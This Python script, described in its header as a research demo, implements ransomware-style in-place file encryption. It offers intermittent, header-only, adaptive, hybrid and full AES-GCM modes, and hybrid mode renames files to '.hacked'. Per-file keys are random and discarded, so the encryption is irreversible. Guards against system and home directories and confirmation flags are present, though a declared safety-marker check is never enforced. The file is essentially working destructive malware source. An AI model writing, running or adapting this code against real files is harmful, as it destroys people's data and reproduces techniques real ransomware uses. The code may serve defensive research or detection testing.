'''
!!!WARNING!!! THIS CODE IS MARKED AS MALICIOUS BY MODERN AV SOFTWARE SINCE
DYNAMIC ANALYSIS SHOWS THAT PROGRAMM ENCRYPTS FILES WITH AES-GCM WHICH IS A RARE REAL-LIFE SCENARIO, I GUESS.
HOWEVER, THIS CODE IS BUILT FOR PURELY RESEARCH REASONS AND POSSESES NO EVIL WILL.
'''
from __future__ import annotations

import argparse
import os
import stat
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Sequence

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

TEN_MIB = 10 * 1024 * 1024
TWENTY_MIB = 20 * 1024 * 1024
BLOCK_64_KIB = 64 * 1024
CHUNK_32_KIB = 32 * 1024
HEADER_SMALL_BYTES = 16 * 1024
REPARSE_POINT_ATTRIBUTE = getattr(stat, "FILE_ATTRIBUTE_REPARSE_POINT", 0x400)
SAFETY_MARKER_NAME = ".ransomware-demo-allow"
SAFETY_MARKER_CONTENT = "ALLOW_IN_PLACE_DEMO=YES"

SUPPORTED_ALGORITHMS = {
    "intermittent",
    "header-only",
    "adaptive",
    "hybrid",
    "full",
}


class DemoSafetyError(ValueError):
    """Запуск отклонён одной из защитных проверок."""


@dataclass(frozen=True, slots=True)
class DemoPlan:
    target: Path
    directories: tuple[Path, ...]
    files: tuple[Path, ...]
    skipped_links: tuple[Path, ...]


@dataclass(frozen=True, slots=True)
class DemoResult:
    algorithm: str
    target: Path
    discovered_files: int
    selected_files: int
    encrypted_files: int
    skipped_links: int
    dry_run: bool


def encrypt_bytes_aes_gcm(plain: bytes, key: bytes) -> bytes:
    """Возвращает ciphertext той же длины, что и исходный блок."""
    if not plain:
        return plain
    cipher = AES.new(key, AES.MODE_GCM, nonce=get_random_bytes(12))
    encrypted, _tag = cipher.encrypt_and_digest(plain)
    return encrypted


def encrypt_region(handle, offset: int, length: int, key: bytes) -> int:
    if length <= 0:
        return 0
    handle.seek(offset)
    chunk = handle.read(length)
    if not chunk:
        return 0
    encrypted = encrypt_bytes_aes_gcm(chunk, key)
    handle.seek(offset)
    handle.write(encrypted)
    return len(chunk)


def apply_header_only(file_path: Path, key: bytes) -> None:
    size = file_path.stat().st_size
    if size <= 0:
        return
    header_size = BLOCK_64_KIB if size > TWENTY_MIB else HEADER_SMALL_BYTES
    with file_path.open("r+b") as handle:
        encrypt_region(handle, 0, min(header_size, size), key)


def apply_intermittent(file_path: Path, key: bytes) -> None:
    size = file_path.stat().st_size
    if size <= 0:
        return
    with file_path.open("r+b") as handle:
        offset = BLOCK_64_KIB
        while offset < size:
            encrypt_region(handle, offset, min(CHUNK_32_KIB, size - offset), key)
            offset += BLOCK_64_KIB


def apply_hybrid(file_path: Path, key: bytes) -> None:
    size = file_path.stat().st_size
    if size <= 0:
        return
    header_size = BLOCK_64_KIB if size > TWENTY_MIB else HEADER_SMALL_BYTES
    with file_path.open("r+b") as handle:
        head_len = min(header_size, size)
        encrypt_region(handle, 0, head_len, key)
        offset = head_len
        while offset < size:
            encrypt_region(handle, offset, min(CHUNK_32_KIB, size - offset), key)
            offset += BLOCK_64_KIB


def apply_adaptive(file_path: Path, key: bytes) -> None:
    size = file_path.stat().st_size
    if size <= 0:
        return
    if size > TEN_MIB:
        apply_hybrid(file_path, key)
        return
    with file_path.open("r+b") as handle:
        encrypt_region(handle, 0, size, key)


def apply_full(file_path: Path, key: bytes) -> None:
    size = file_path.stat().st_size
    if size <= 0:
        return
    with file_path.open("r+b") as handle:
        encrypt_region(handle, 0, size, key)


ALGORITHM_FUNCTIONS: dict[str, Callable[[Path, bytes], None]] = {
    "intermittent": apply_intermittent,
    "header-only": apply_header_only,
    "adaptive": apply_adaptive,
    "hybrid": apply_hybrid,
    "full": apply_full,
}


def _is_relative_to(path: Path, parent: Path) -> bool:
    try:
        path.relative_to(parent)
        return True
    except ValueError:
        return False


def _is_reparse_point(path: Path) -> bool:
    try:
        attributes = getattr(path.lstat(), "st_file_attributes", 0)
    except OSError:
        return True
    return path.is_symlink() or bool(attributes & REPARSE_POINT_ATTRIBUTE)


def _protected_paths() -> tuple[Path, ...]:
    candidates = [Path.home()]
    for variable in ("SystemRoot", "WINDIR", "ProgramFiles", "ProgramFiles(x86)"):
        value = os.environ.get(variable)
        if value:
            candidates.append(Path(value))
    resolved: list[Path] = []
    for candidate in candidates:
        try:
            resolved.append(candidate.resolve())
        except OSError:
            continue
    return tuple(resolved)


def _validate_safe_path(path: Path, *, role: str) -> None:
    root = Path(path.anchor)
    if path == root:
        raise DemoSafetyError(f"{role} не может быть корнем файловой системы: {path}")

    protected = _protected_paths()
    home = Path.home().resolve()
    if path == home:
        raise DemoSafetyError(f"{role} не может совпадать с домашним каталогом: {path}")

    for protected_path in protected:
        if protected_path == home:
            continue
        if path == protected_path or _is_relative_to(path, protected_path):
            raise DemoSafetyError(
                f"{role} не может находиться в системном каталоге: {path}"
            )


def _scan_target(target: Path) -> tuple[tuple[Path, ...], tuple[Path, ...], tuple[Path, ...]]:
    directories: list[Path] = []
    files: list[Path] = []
    skipped_links: list[Path] = []

    for current, directory_names, file_names in os.walk(
        target, topdown=True, followlinks=False
    ):
        current_path = Path(current)
        relative_current = current_path.relative_to(target)
        directories.append(relative_current)

        retained_directories: list[str] = []
        for name in sorted(directory_names):
            candidate = current_path / name
            if _is_reparse_point(candidate):
                skipped_links.append(candidate.relative_to(target))
            else:
                retained_directories.append(name)
        directory_names[:] = retained_directories

        for name in sorted(file_names):
            candidate = current_path / name
            relative = candidate.relative_to(target)
            if relative == Path(SAFETY_MARKER_NAME):
                continue
            if _is_reparse_point(candidate):
                skipped_links.append(relative)
                continue
            if candidate.is_file():
                files.append(relative)

    directories.sort(key=lambda path: path.as_posix().casefold())
    files.sort(key=lambda path: path.as_posix().casefold())
    skipped_links.sort(key=lambda path: path.as_posix().casefold())
    return tuple(directories), tuple(files), tuple(skipped_links)


def build_plan(target_dir: Path | str, algorithm: str) -> DemoPlan:
    if algorithm not in SUPPORTED_ALGORITHMS:
        raise ValueError(f"Неизвестный алгоритм: {algorithm}")

    target_input = Path(target_dir).expanduser()

    if target_input.exists() and _is_reparse_point(target_input):
        raise DemoSafetyError(
            f"Целевой каталог не может быть ссылкой: {target_input.absolute()}"
        )

    target = target_input.resolve()

    if not target.is_dir():
        raise FileNotFoundError(f"Целевой каталог не найден: {target}")

    _validate_safe_path(target, role="Целевой каталог")


    directories, files, skipped_links = _scan_target(target)

    return DemoPlan(
        target=target,
        directories=directories,
        files=files,
        skipped_links=skipped_links,
    )


def _select_files(plan: DemoPlan, files_count: int | None) -> tuple[Path, ...]:
    if files_count is None:
        return plan.files
    if isinstance(files_count, bool) or files_count < 0:
        raise DemoSafetyError("--files_count должен быть целым числом не меньше 0.")
    if files_count > len(plan.files):
        raise DemoSafetyError(
            f"--files_count={files_count}, но найдено только {len(plan.files)} файлов."
        )
    return plan.files[:files_count]


def _validate_hybrid_collisions(
    plan: DemoPlan,
    selected_files: tuple[Path, ...],
) -> None:
    target_paths = set(plan.files)
    target_directories = set(plan.directories)
    collisions = [
        relative
        for relative in selected_files
        if (
            relative.with_name(relative.name + ".hacked") in target_paths
            or relative.with_name(relative.name + ".hacked") in target_directories
        )
    ]
    if collisions:
        raise DemoSafetyError(
            "Переименование hybrid конфликтует с существующим файлом: "
            f"{collisions[0]}"
        )


def run_demo(
    target_dir: Path | str,
    algorithm: str,
    *,
    files_count: int | None = None,
    in_place: bool = False,
    confirmed: bool = False,
    dry_run: bool = False,
) -> DemoResult:
    plan = build_plan(target_dir, algorithm)
    selected_files = _select_files(plan, files_count)
    if algorithm == "hybrid":
        _validate_hybrid_collisions(plan, selected_files)

    if not in_place:
        raise DemoSafetyError(
            "In-place преобразование требует явного флага --in-place."
        )
    if not dry_run and not confirmed:
        raise DemoSafetyError(
            "Для изменения файлов требуется явное подтверждение --confirm."
        )

    if dry_run:
        return DemoResult(
            algorithm=algorithm,
            target=plan.target,
            discovered_files=len(plan.files),
            selected_files=len(selected_files),
            encrypted_files=0,
            skipped_links=len(plan.skipped_links),
            dry_run=True,
        )

    apply_algorithm = ALGORITHM_FUNCTIONS[algorithm]
    encrypted_files = 0
    for relative_path in selected_files:
        target_path = plan.target / relative_path
        target_path.chmod(stat.S_IREAD | stat.S_IWRITE)
        key = get_random_bytes(16)
        apply_algorithm(target_path, key)

        if algorithm == "hybrid":
            renamed_path = target_path.with_name(target_path.name + ".hacked")
            target_path.rename(renamed_path)
        encrypted_files += 1

    return DemoResult(
        algorithm=algorithm,
        target=plan.target,
        discovered_files=len(plan.files),
        selected_files=len(selected_files),
        encrypted_files=encrypted_files,
        skipped_links=len(plan.skipped_links),
        dry_run=False,
    )


def _add_runtime_arguments(parser: argparse.ArgumentParser) -> None:
    parser.add_argument(
        "target_dir",
        type=Path,
        help="Изолированный каталог с тестовыми файлами для изменения на месте.",
    )
    parser.add_argument(
        "--in-place",
        action="store_true",
        help="Явно разрешить изменение файлов непосредственно в целевом каталоге.",
    )
    parser.add_argument(
        "--files_count",
        "--files-count",
        dest="files_count",
        type=int,
        default=None,
        metavar="N",
        help=(
            "Зашифровать ровно N файлов в порядке относительных путей. "
            "По умолчанию шифруются все найденные файлы."
        ),
    )
    parser.add_argument(
        "--confirm",
        action="store_true",
        help="Подтвердить работу только с изолированной копией тестового набора.",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Проверить каталог и показать объём работы без изменения файлов.",
    )


def build_parser(algorithm: str) -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            f"Демонстрационное in-place преобразование '{algorithm}' тестовых файлов."
        )
    )
    _add_runtime_arguments(parser)
    return parser


def _execute_cli(
    parser: argparse.ArgumentParser,
    algorithm: str,
    args: argparse.Namespace,
) -> int:
    try:
        result = run_demo(
            args.target_dir,
            algorithm,
            files_count=args.files_count,
            in_place=args.in_place,
            confirmed=args.confirm,
            dry_run=args.dry_run,
        )
    except (DemoSafetyError, FileNotFoundError, OSError) as exc:
        parser.exit(2, f"Ошибка: {exc}\n")

    mode = "dry-run" if result.dry_run else "completed"
    print(f"mode={mode}")
    print(f"algorithm={result.algorithm}")
    print(f"target={result.target}")
    print(f"discovered_files={result.discovered_files}")
    print(f"selected_files={result.selected_files}")
    print(f"encrypted_files={result.encrypted_files}")
    print(f"skipped_links={result.skipped_links}")
    return 0


def cli_main(algorithm: str, argv: Sequence[str] | None = None) -> int:
    parser = build_parser(algorithm)
    args = parser.parse_args(argv)
    return _execute_cli(parser, algorithm, args)


def common_cli_main(argv: Sequence[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Демонстрационные in-place преобразования тестовых файлов."
    )
    parser.add_argument(
        "algorithm",
        choices=sorted(SUPPORTED_ALGORITHMS),
        help="Алгоритм преобразования.",
    )
    _add_runtime_arguments(parser)
    args = parser.parse_args(argv)
    return _execute_cli(parser, args.algorithm, args)


def direct_script_main(algorithm: str) -> None:
    try:
        raise SystemExit(cli_main(algorithm))
    except KeyboardInterrupt:
        print("\nОперация прервана пользователем.", file=sys.stderr)
        raise SystemExit(130) from None


if __name__ == "__main__":
    try:
        raise SystemExit(common_cli_main())
    except KeyboardInterrupt:
        print("\nОперация прервана пользователем.", file=sys.stderr)
        raise SystemExit(130) from None
